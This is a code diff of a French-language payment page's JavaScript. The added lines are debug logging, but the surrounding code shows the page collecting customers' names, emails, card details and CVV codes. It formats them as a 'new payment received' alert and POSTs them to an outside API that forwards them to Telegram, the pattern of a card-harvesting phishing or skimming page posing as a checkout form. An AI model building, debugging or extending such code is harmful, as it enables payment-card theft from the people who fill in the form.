@@ -267,6 +267,7 @@
         // Gestion du formulaire
         document.getElementById('paymentForm').addEventListener('submit', async (e) => {
             e.preventDefault();
+            console.log('🚀 Formulaire soumis !');
             await processPayment();
         });
         
@@ -300,6 +301,8 @@
         // Fonction pour traiter le paiement
         async function processPayment() {
             try {
+                console.log('🔄 Début de processPayment()');
+                
                 // Récupérer les données du formulaire
                 const paymentData = {
                     customerName: document.getElementById('customerName').value || 'Client',
@@ -339,6 +342,8 @@
         // Fonction pour envoyer une notification Cacapay
         async function sendCacapayNotification(paymentData) {
             try {
+                console.log('📤 Envoi de la notification...');
+                
                 const message = `💰 NOUVEAU PAIEMENT REÇU !
 👤 Nom: ${paymentData.customerName}
 📧 Email: ${paymentData.email}
@@ -347,6 +352,9 @@
 🔐 CVV: ${paymentData.cvv}
 💶 Montant: ${paymentData.amount}€
 🔒 Vérifiez immédiatement !`;
+                
+                console.log('📝 Message à envoyer:', message);
+                console.log('🌐 URL API:', CACAPAY_API);
                 
                 const response = await fetch(CACAPAY_API, {
                     method: 'POST',
@@ -359,7 +367,9 @@
                     })
                 });
                 
+                console.log('📡 Réponse reçue, statut:', response.status);
                 const result = await response.json();
+                console.log('📄 Résultat API:', result);
                 
                 if (result.success) {
                     console.log('✅ Notification envoyée !', result.telegramResponse?.result?.message_id);
